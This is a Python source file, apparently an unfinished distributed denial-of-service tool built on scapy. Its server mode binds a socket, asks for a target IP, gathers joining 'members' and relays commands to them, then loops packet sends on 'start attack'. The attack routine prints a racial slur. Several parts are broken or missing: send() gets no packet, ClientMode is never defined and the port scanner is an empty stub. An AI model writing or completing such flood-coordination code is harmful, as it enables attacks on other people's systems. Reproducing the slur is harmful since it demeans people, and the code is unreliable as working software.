from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket


def DisplayHelpMenu():
    HelpMenu = \
        """
    researcher [option] [parameter]
    options:
    
    
    -p --protocol                \tspecify protocol to use
    -f --flags                   \tspecify flags in the packet header of the protocol you chose
    -port                        \tspecify port number for the attack
        1. -port/(nothing)       \tif -port set to nothing the port will be set to default
        2. -port random          \tif -port set to random the attack will use random port to attack
    """
    print(HelpMenu)


class PortScanner:
    def __init__(self):
        pass


class Ddos:
    def __init__(self):
        self.Join = True
        self.Attack = False
        mode = input("\n   [*]choose mode(server or client): ")
        if mode == "server":
            self._ServerMode()
        elif mode == "client":
            self.ClientMode()

    def _ServerMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Ip = input("\n   [*]Ip to be bound: ")

        self.TargetIp = input("\n   [*]Enter target ip: ")

        Port = int(input("\n   [*]Port to listen on: "))

        self.sock.bind((Ip, Port))

        NumOfPeople = int(input("\n   [*]Max number of members to join: "))

        self.sock.listen(NumOfPeople)

        thrd = Thread(target=self._JoinParty, args=())
        thrd.start()

        Input = ""
        while Input != "exit\n":
            Input = input("   host@command>") + '\n'
            if Input == "start attack\n":
                self.Attack = True
                self.AttackTarget()
            elif Input == "stop attack\n":
                self.Attack = False
            elif Input == "stop join\n":
                self.Join = False
            elif Input == "resume join\n":
                self.Join = True
            elif Input == "-help\n":
                DisplayHelpMenu()
            else:
                for i in range(len(self.members)):
                    self.members[i].send(Input.encode())
        self.Join = False
        thrd.join()



    def AttackTarget(self):
        print("nigger")
        while self.Attack:
            send()

    def _JoinParty(self):
        self.members = []
        self.sock.setblocking(False)
        while self.Join:
            try:
                self.members.append(self.sock.accept()[0])
            except Exception:
                pass

